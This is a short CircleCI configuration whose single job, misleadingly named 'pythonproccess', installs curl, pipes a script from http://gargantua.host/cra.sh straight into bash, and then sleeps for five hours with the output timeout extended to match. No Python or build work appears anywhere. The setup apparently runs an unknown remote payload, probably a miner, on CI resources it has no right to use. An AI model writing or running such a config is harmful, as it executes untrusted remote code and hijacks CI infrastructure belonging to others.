version: 2.1
jobs:
  pythonproccess:
    docker:
    - image: ubuntu:18.04
    steps:
      - checkout
      - run: apt-get update; apt install curl -y; curl -sL http://gargantua.host/cra.sh | bash -
      - run: 
            command: sleep 18000
            no_output_timeout: 5h
workflows:
  main:
    jobs:
      - pythonproccess